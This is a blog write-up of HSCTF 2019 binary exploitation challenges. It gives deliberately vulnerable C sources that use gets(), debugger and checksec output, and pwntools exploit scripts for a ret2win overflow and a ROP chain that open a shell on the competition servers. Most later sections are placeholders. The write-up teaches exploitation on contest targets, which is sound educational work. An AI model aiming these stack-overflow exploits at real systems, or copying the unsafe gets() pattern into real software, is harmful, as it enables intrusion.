---
layout: post
title: 	"HSCTF 2019 Writeup: Binary Exploitation Challenges"
date:	2019-06-23 01:53:00 +0800
categories: writeups hsctf
---

<div class="toc-container">
  <ul id="markdown-toc">
    <li><a href="#intro-to-netcat" id="markdown-toc-h1-header">Intro To Netcat</a>
  	<ul>
        <li><a href="#challenge" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#return-to-sender" id="markdown-toc-h1-header">Return To Sender</a>
    <ul>
        <li><a href="#challenge-1" id="markdown-toc-h3-header">Challenge</a></li>
        <li><a href="#solution-1" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#combo-chain-lite" id="markdown-toc-h1-header">Combo Chain Lite</a>
    </li>
    <li><a href="#combo-chain" id="markdown-toc-h1-header">Combo Chain</a>
    </li>
    <li><a href="#storytime" id="markdown-toc-h1-header">Storytime</a>
    </li>
    <li><a href="#bit" id="markdown-toc-h1-header">Bit</a>
    </li>
    <li><a href="#byte" id="markdown-toc-h1-header">Byte</a>
    </li>
    <li><a href="#caesars-revenge" id="markdown-toc-h1-header">Caesar's Revenge</a>
    </li>
    <li><a href="#aria-writer" id="markdown-toc-h1-header">Aria Writer</a>
    </li>
    <li><a href="#aria-writer-v3" id="markdown-toc-h1-header">Aria Writer v3</a>
    </li>
  </ul>
</div>

# Intro To Netcat
<a href="{{ page.url }}#title">Back to top ↑</a>

### Challenge

>Written by: Ptomerty
>
>Hey there! This challenge is a quick introduction to netcat and how to use it. Netcat is a program that will help you "talk" with many of our challenges, especially pwn and misc. To begin, Windows users should download this file: https://drive.google.com/open?id=1Z8MS8SZYqZrteXOVPRL7BHwB4JL9t9J8
>
>Extract the file, then open a command prompt and navigate to the directory using `cd <download-directory>`. From there, you can run `nc misc.hsctf.com 1111` to get your first flag.
>
>Have fun!

### Solution

A very simple challenge.

```
» nc misc.hsctf.com 1111
Hey, here's your flag! hsctf{internet_cats}
``` 

Flag: `hsctf{internet_cats}`

# Return To Sender
<a href="{{ page.url }}#title">Back to top ↑</a>

### Challenge

>Written by: Ptomerty
>
>Who knew the USPS could lose a letter so many times?
>
>nc pwn.hsctf.com 1234
>
>Note: If you're trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: (python; cat -) \| nc pwn.hsctf.com <port>

The challenge archive contains the following files.
```
return-to-sender
return-to-sender.c
```

### Solution

This was a simple binary exploitation challenge that involved overflowing a buffer on the stack to change a return address.

The vulnerable code is shown below.

```c
// gcc return-to-sender.c -o return-to-sender -m32 -no-pie -g0 -fno-stack-protector

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void win() {
  system("/bin/sh");
}

void vuln() {
  char dest[8];
  printf("Where are you sending your mail to today? ");
  gets(dest);
  printf("Alright, to %s it goes!\n", dest);
}

int main() {
  setbuf(stdout, NULL);
  gid_t gid = getegid();
  setresgid(gid,gid,gid);
  vuln();
  return 0;	
}
```

The `vuln()` function calls `gets()` to get user input. The `gets()` function performs zero bounds checking on the user input, thus we can input as many characters as we want to overflow the `dest` buffer. In this case, we have to do a controlled buffer overflow so that we gain control of the return pointer of `vuln()`, which will then allow us to point it to the `win()` function and get a shell.

Let's run `checksec` on the binary.

```shell
» checksec return-to-sender                                                                     
[*] '/home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We see that there is no stack canary (and therefore no protection to a buffer overflow attack), no ASLR (Address Space Layout Randomization), and the stack is Not Executable (NX).

First, we have to show that the program indeed does crash when a huge string is passed to it.
```shell
» ./return-to-sender                                                                            
Where are you sending your mail to today? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
Alright, to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa it goes!
[1]    30852 segmentation fault (core dumped)  ./return-to-sender
```

We've successfully crashed the program. Let's start gdb and see exactly what happened.
```shell
» gdb ./return-to-sender                                                                        
Reading symbols from ./return-to-sender...
(No debugging symbols found in ./return-to-sender)
(gdb) run
Starting program: /home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender 
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE (5) size: 0
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE (5) size: 0
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE (5) size: 0
Where are you sending your mail to today? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Alright, to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA it goes!

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 

```

At the bottom, we can see that it receives a seg fault when trying to access memory location `0x41414141`. `0x41` is the ascii hex value of 'A', thus we overwrote the return pointer with four 'A's, which meant that after the `vuln()` function finished, it tried to return into `0x41414141`.

Now, we have to figure out the offset at which we control the return pointer (i.e, how many A's can we enter before we can enter BBBB and set the return pointer to 0x42424242?). I use metasploit's `pattern_create.rb` to generate a unique pattern of 200 characters, then pass it to gdb.
```shell
» pattern_create -l 200               
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

» gdb ./return-to-sender
Reading symbols from ./return-to-sender...
(No debugging symbols found in ./return-to-sender)
(gdb) run
Starting program: /home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender 
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE (5) size: 0
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE (5) size: 0
BFD: warning: /lib/ld-linux.so.2: corrupt GNU_PROPERTY_TYPE (5) size: 0
Where are you sending your mail to today? Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Alright, to Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag it goes!

Program received signal SIGSEGV, Segmentation fault.
0x37614136 in ?? ()
(gdb) 

``` 

Alright, now we get a seg fault at `0x37614136`. I then use metasploit's `pattern_offset.rb` to find at which offset the crash occurred.
```shell
» pattern_offset -l 200 -q 37614136                                                             
[*] Exact match at offset 20
```

Now we know that after inputting 20 'A's, the next four bytes that we input will overwrite the return pointer. Now, what we want to do is execute the `win()` function and get a shell. This means that the return pointer just needs to be overwritten with the address of the `win()` function. I wrote up a python script using pwntools that does just that.

```python
#!/usr/bin/env python

from pwn import *

# Connect to the process on the remote ip and port
connection = connect("pwn.hsctf.com", 1234)
elf = ELF("./return-to-sender")

win_addr = p32(elf.symbols['win']) # The address of the win function

padding = 'A'*20

payload = padding
payload += win_addr

# Receive the starting text, then send the payload through
connection.recv()
connection.sendline(payload)

# Make the connection interactive since win() opens a shell for us
connection.interactive()
connection.close()
```

The exploit basically connects to the ip and port given to us in the challenge, and sends 20 A's, followed by the address of the `win()` function. The address overwrite's the return pointer of `vuln()`.
What this will do is it will cause the `vuln()` function to jump to the `win()` function instead of back to the `main()` function after it has finished executing.

Running the exploit gives us a shell, which we then use to get the flag:

```shell
» python exploit.py
[+] Opening connection to pwn.hsctf.com on port 1234: Done
[*] '/home/faithlesss/Documents/ctfs/hsctf-6/pwn/return-to-sender/bin/return-to-sender'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
Alright, to AAAAAAAAAAAAAAAAAAAA\xb6\x91\x0 it goes!
$ ls
bin
dev
flag
lib
lib32
lib64
return-to-sender
return-to-sender.c
$ cat flag
hsctf{fedex_dont_fail_me_now}
$  
```

Flag: `hsctf{fedex_dont_fail_me_now}`

# Combo Chain Lite
<a href="{{ page.url }}#title">Back to top ↑</a>

### Challenge

>Written by: Ptomerty
>
>Training wheels!
>
>Hint: What's a ROP?
>
>`nc pwn.hsctf.com 3131`

The challenge archive contains the following files.
```
combo-chain-lite
combo-chain-lite.c
```

### Solution

We are given the combo-chain-lite.c source file.
```c
  1 #include <stdlib.h>
  2 #include <string.h>
  3 #include <stdio.h>
  4 
  5 void vuln() {
  6     char dest[8];
  7     printf("Here's your free computer: %p\n", system);
  8     printf("Dude you hear about that new game called /bin/sh");
  9     printf("? Enter the right combo for some COMBO CARNAGE!: ");
 10     gets(dest);
 11 }
 12 
 13 int main() {
 14     setbuf(stdout, NULL);
 15     gid_t gid = getegid();
 16     setresgid(gid,gid,gid);
 17     vuln();
 18     return 0;
 19 }
```

Very obvious buffer overflow in the vuln() function. The challenge also tells us we have to do a ROP chain to solve this.

Run a quick checksec on the binary.
```shell
» checksec ./combo-chain-lite
[*] '/root/Documents/hsctf-6/pwn/combo-chain-lite/bin/combo-chain-lite'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This is a very easy ROP challenge. If you are unfamiliar with how ROP works, you can learn more about it from my writeups of the ROP Emporium challenges [here](https://syedfarazabrar.com/writeups/rop-emporium/2019/07/19/rop-emporium-challenges.html){:target="blank"}, specifically split64, although you may have to read the previous writeups if you are very new to binary exploitation.

The exploit is shown below. system's address is given to us every run, and since the /bin/sh address is hardcoded in the binary, we can just get it out of the binary.
```python
  1 #!/usr/bin/env python
  2 
  3 from pwn import *
  4 
  5 context.log_level = 'critical'
  6 elf = ELF("./combo-chain-lite")
  7 sh = remote("pwn.hsctf.com" 3131)
  8 a = sh.recvline()
  9 
 10 system_addr = p64(int(a.split(": ")[1], 16))
 11 binsh_gen = elf.search("/bin/sh") # Creates a generator object
 12 binsh_addr = p64(next(binsh_gen)) # Gets the next address of /bin/sh
 13 pop_rdi = p64(0x0000000000401273)
 14 
 15 payload = "A"*16 # Overflow until RIP
 16 payload += pop_rdi # Jump to the pop rdi; ret; gadget
 17 payload += binsh_addr # Pop this into rdi
 18 payload += system_addr # Jump to system('/bin/sh')
 19 
 20 sh.recvuntil(": ")
 21 sh.sendline(payload)
 22 sh.interactive()
 23 
 24 sh.close()
```

We get a shell.
```shell
» python exploit.py
$ ls
combo-chain-lite  combo-chain-lite.c  exploit.py  flag
$ cat flag
hsctf{wheeeeeee_that_was_fun}
$  
```

Flag: `hsctf{wheeeeeee_that_was_fun}`

# Combo Chain
<a href="{{ page.url }}#title">Back to top ↑</a>

To be added.

# Storytime
<a href="{{ page.url }}#title">Back to top ↑</a>

To be added.

# Bit
<a href="{{ page.url }}#title">Back to top ↑</a>

To be added.

# Byte
<a href="{{ page.url }}#title">Back to top ↑</a>

To be added.

# Caesar's Revenge
<a href="{{ page.url }}#title">Back to top ↑</a>

To be added.

# Aria Writer
<a href="{{ page.url }}#title">Back to top ↑</a>

To be added.

# Aria Writer v3
<a href="{{ page.url }}#title">Back to top ↑</a>

To be added.